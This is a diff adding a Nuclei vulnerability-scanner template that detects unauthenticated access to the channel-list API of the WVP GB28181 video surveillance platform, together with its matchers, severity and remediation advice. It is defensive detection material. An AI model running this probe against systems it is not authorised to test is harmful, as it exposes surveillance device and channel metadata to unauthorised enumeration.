@@ -1,0 +1,54 @@
+id: wvp-28181-fusion-platform-api-unauth
+
+info:
+  name: WVP 28181 Fusion Platform Channel API Unauthorized Access
+  author: lbb
+  severity: medium
+  description: The WVP 28181 Fusion Platform exposes the `/api/common/channel/list` endpoint without proper authentication, allowing unauthenticated users to access channel information.
+  impact: Successful exploitation may allow attackers to enumerate channel resources, collect device information, and obtain sensitive video surveillance metadata.
+  remediation: Implement proper authentication and authorization controls for all API endpoints and restrict access to trusted users only.
+  reference:
+    - https://github.com/648540858/wvp-GB28181-pro
+  classification:
+    cwe-id: CWE-862
+    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N
+    cvss-score: 5.3
+  metadata:
+    vendor: WVP
+    product: GB28181
+    verified: true
+    vuln-labels: 未授权访问
+  tags: WVP视频平台
+
+requests:
+  - method: GET
+    path:
+      - "{{BaseURL}}/api/common/channel/list?page=1&count=15"
+
+    headers:
+      Accept: "application/json, text/plain, */*"
+      User-Agent: "Mozilla/5.0 (Nuclei Scanner)"
+
+    matchers-condition: and
+
+    matchers:
+      - type: word
+        part: body
+        condition: and
+        words:
+          - "\"code\":0"
+          - "\"msg\":\"成功\""
+          - "\"data\""
+
+      - type: word
+        part: body
+        condition: and
+        words:
+          - "gbDeviceId"
+          - "gbManufacturer"
+          - "gbStatus"
+
+      - type: word
+        part: header
+        words:
+          - "application/json"
